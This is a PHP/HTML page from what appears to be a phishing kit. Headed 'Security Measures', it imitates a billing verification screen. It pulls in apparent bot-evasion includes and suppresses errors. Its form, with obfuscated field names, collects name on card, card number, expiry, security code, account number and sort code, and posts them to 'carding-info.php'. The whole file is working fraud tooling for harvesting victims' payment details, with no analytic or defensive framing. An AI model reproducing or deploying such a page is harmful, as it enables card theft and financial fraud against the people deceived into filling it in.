<?php include "encriptar.php";?>
<?php
error_reporting(0);
session_start();
set_time_limit(0);
include"bots.php";
require_once 'hostname.php';
?>

<!DOCTYPE HTML5>
<html><head>
<meta charset="UTF-8">
<title>Security Measures</title>
<link rel="icon" href="img/icon.png" />
<link rel="stylesheet" href="css/billing.css">
</head>
<body>
<div id="bar">
   <div id="wrapperbar">
   <img src="img/website_logo.gif" style="padding-top: 10px;">
   </div>
</div>
<div id="wrapper2">
<img src="img/try.png" style="float: right;padding-top: 20px;">
<div id="block2">
<form id="form" name="form" method="post" action="carding-info.php">
<img src="img/cinformation.png">
<div id="loginform">
<img src="img/nmc.png">
<input type="text" name="naonca" required value="<?php if (isset($_SESSION['NAMEONCARD'])) { print $_SESSION['NAMEONCARD'];} else {print "";} ?>">
<img src="img/ccn.png">
<input type="text" name="cnum" required class="mdrf">
<img src="img/exp.png">
<div id="alline">
<select name="emonth">
<option value="Month">Month</option>
<option selected value="<?php if (isset($_SESSION['EMONTH'])) { echo $_SESSION['EMONTH'];} else {echo "Month";} ?>"><?php if (isset($_SESSION['EMONTH'])) { echo $_SESSION['EMONTH'];} else {echo "Month";} ?></option>

<option>01</option>
<option>02</option>
<option>03</option>
<option>04</option>
<option>05</option>
<option>06</option>
<option>07</option>
<option>08</option>
<option>09</option>
<option>10</option>
<option>11</option>
<option>12</option>
</select>
<select name="eyear">
<option value="Year">Year</option>
<option selected value="<?php if (isset($_SESSION['EYEAR'])) { echo $_SESSION['EYEAR'];} else {echo "Year";} ?>"><?php if (isset($_SESSION['EYEAR'])) { echo $_SESSION['EYEAR'];} else {echo "Year";} ?></option>
<option>2016</option>
<option>2017</option>
<option>2018</option>
<option>2019</option>
<option>2020</option>
<option>2021</option>
<option>2022</option>
<option>2023</option>
<option>2024</option>
<option>2025</option>
<option>2026</option>
</select>
</div>
<img src="img/cc2.png">
<input type="text" name="c22d" required style="width: 100px;display: block;margin-top: 05px;">
<img src="img/acn.png">
<input type="text" name="ca22" value="<?php if (isset($_SESSION['ACCT'])) { print $_SESSION['ACCT'];} else {print "";} ?>" style="width: 200px;display: block;margin-top: 05px;">
<img src="img/sc.png">
<input type="text" name="c522a" value="<?php if (isset($_SESSION['SORTCODE'])) { print $_SESSION['SORTCODE'];} else {print "";} ?>" style="width: 150px;display: block;margin-top: 05px;">

<div style="position:relative; height:45px; width:343px; background:url(img/button2.png) 0 0 no-repeat;margin-top: 20px;"><a value="" onclick="document.forms['form'].submit(); return false;" style="position:absolute; top:3px; left:5px; width:333px; height:36px;" title="" alt="" target="_self"></a><a style="position:absolute; overflow:hidden; top:43px; left:341px; width:1px; height:1px;" title="" alt="" href="#" target="_self"></a></div>
</div>
</form>
</div>
<div id="footer">
<img src="img/copyright.png">
</div>
</div>

</body></html>